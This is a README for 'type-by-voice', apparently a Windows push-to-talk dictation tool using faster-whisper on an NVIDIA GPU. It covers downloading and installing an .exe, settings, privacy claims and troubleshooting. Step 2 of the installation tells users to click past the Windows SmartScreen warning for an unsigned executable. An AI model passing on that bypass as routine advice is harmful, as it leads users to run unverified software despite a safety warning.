# 🎙️ type-by-voice - Speak to type in any application

[![](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/tatec756/type-by-voice/releases)

type-by-voice turns your spoken words into text inside any program on your computer. It runs locally on your machine. Your voice data never leaves your computer, and you do not need an account or cloud access. This tool uses your graphics card to process speech quickly. It supports dictation in multiple languages and works with the press of a single button.

## ⚙️ System Requirements

Your computer needs specific parts to run this tool well.

- Operating System: Windows 10 or Windows 11.
- Graphics Card: An NVIDIA GPU with at least 4GB of video memory.
- RAM: 8GB or more.
- Drivers: You must have the latest NVIDIA drivers installed.

If you lack a compatible NVIDIA graphics card, the program may perform slowly or fail to launch. The tool relies on your graphics card to handle the transcription tasks through the faster-whisper engine.

## 📥 Getting Started

Follow these steps to set up the software.

1. Visit the [releases page](https://github.com/tatec756/type-by-voice/releases) to find the latest version of the application.
2. Look for the file ending in `.exe` under the Assets section.
3. Click the file to start the download.
4. Save the file to your desktop or your Downloads folder.

## 🛠️ Installation and Setup

Once the file finishes downloading, complete these steps to prepare your system.

1. Double-click the downloaded `.exe` file.
2. Windows might show a blue window labeled "Windows protected your PC." This happens because the app is not digitally signed. Click "More info" and then click "Run anyway."
3. Follow the instructions that appear in the installation window. The installer copies the necessary files and sets up a shortcut on your desktop.
4. After the installer finishes, double-click the type-by-voice desktop icon to open the program.

## 🎙️ Using the Tool

The program runs in the background. You can see its icon in the system tray near your clock.

1. Open the application where you wish to type, such as a web browser or a text editor.
2. Press and hold your push-to-talk key. The default key is usually set to a specific button on your keyboard. Check the settings menu inside the app to see or change this key.
3. Speak clearly into your microphone while holding the key.
4. Release the key when you finish speaking. The program converts your audio to text and types it into your active document.

## 🎛️ Adjusting Settings

You can change how the tool behaves to fit your needs. Right-click the system tray icon and select Settings.

- Language selection: Choose the language you speak. The tool handles Japanese and many other global languages.
- Push-to-talk key: Choose the button that tells the app to listen. Many users prefer a side mouse button or the Ctrl key.
- Speech sensitivity: Adjust the threshold if the app starts listening too early or cuts off your sentences.

A high sensitivity means the app ignores background noise. A low sensitivity helps if the app fails to hear your voice when you speak softly.

## 🔋 Performance Tips

The software uses your GPU to make transcription fast. You can keep your system running smoothly by closing other heavy programs like video games or high-resolution editors while you dictate. Keep your NVIDIA drivers updated to ensure the fastest processing speeds. 

If you notice a delay between your speech and the text appearing, ensure your GPU is not busy with other tasks. The faster-whisper engine works best when it has sole access to your graphics card resources.

## 🔐 Privacy and Security

This application keeps your data private. It does not send your voice recordings to any internet server. It does not share your data with third parties. Every process happens inside your computer. You do not need an internet connection to use the dictation features. This offline design ensures that your work remains secure regardless of your network status.

## ❓ Frequently Asked Questions

What if the text is wrong?
The machine learning model is very accurate, but it sometimes mistakes similar sounds. Speak clearly and verify your text.

Does it work with every program?
It works with any program that accepts text input. If you can click into a window and type with your keyboard, this tool can type there for you.

Can I use it offline?
Yes. The entire engine is included in the download. You can disconnect your internet and continue to dictate without issues.

Do I need an API key?
No. You do not need to sign up for services or enter keys. You perform no transactions to use these features.

What language can I speak?
The software supports many languages. You can select your preferred language in the settings tab.

## 🚀 Troubleshooting

If the program does not work, try these steps:

- Restart the application.
- Check that your microphone functions in other apps.
- Verify that your NVIDIA graphics card is active.
- Ensure that no other voice software is using your microphone at the same time.
- Check the error log in the installation folder if the program closes unexpectedly.

Use the settings menu to reset to default values if you made changes that cause the tool to behave incorrectly. Reinstalling the program from the official link often fixes issues caused by file corruption or missing libraries. If you encounter bugs, check the issues section on the project's repository page to see if others found a fix.